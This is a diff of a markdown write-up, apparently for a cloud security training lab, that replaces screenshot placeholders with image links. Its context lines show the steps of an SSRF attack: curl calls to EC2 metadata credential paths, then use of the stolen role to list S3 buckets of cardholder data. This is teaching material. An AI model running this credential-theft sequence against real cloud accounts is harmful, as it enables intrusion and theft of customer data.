@@ -49,7 +49,7 @@ curl http://<target-ec2-ip>/latest/meta-data/ \
 
 **Finding:** Full EC2 metadata returned including `iam/` endpoint.
 
-📸 *Screenshot: curl output showing full metadata including iam/ directory*
+📸 ![SSRF Metadata Access](ssrf-metadata.png)
 
 ---
 
@@ -84,7 +84,7 @@ curl http://<target-ec2-ip>/latest/meta-data/iam/security-credentials/cg-banking
 }
 ```
 
-📸 *Screenshot: curl output showing Code: Success and credential theft*
+📸 ![S3 Cardholder Breach](s3-cardholder-breach.png)
 
 ---
 
@@ -103,7 +103,8 @@ aws sts get-caller-identity --profile stolen
 
 **Finding:** Now operating as `cg-banking-WAF-Role` — a legitimate AWS role.
 
-📸 *Screenshot: sts get-caller-identity confirming assumed role identity*
+📸 ![S3 Cardholder Breach](s3-cardholder-breach.png)
+
 
 ---
 
@@ -116,7 +117,8 @@ aws s3 ls --profile stolen
 
 **Finding:** Three buckets discovered including `cg-cardholder-data-bucket`.
 
-📸 *Screenshot: s3 ls output showing cardholder data bucket*
+📸 ![S3 Cardholder Breach](s3-cardholder-breach.png)
+
 
 ---
 
@@ -134,7 +136,7 @@ cardholder_data_secondary.csv
 cardholders_corporate.csv
 ```
 
-📸 *Screenshot: s3 ls showing 3 cardholder CSV files — data breach complete*
+📸 ![Cardholder Data Files](s3-cardholder-breach.png)
 
 ---
 
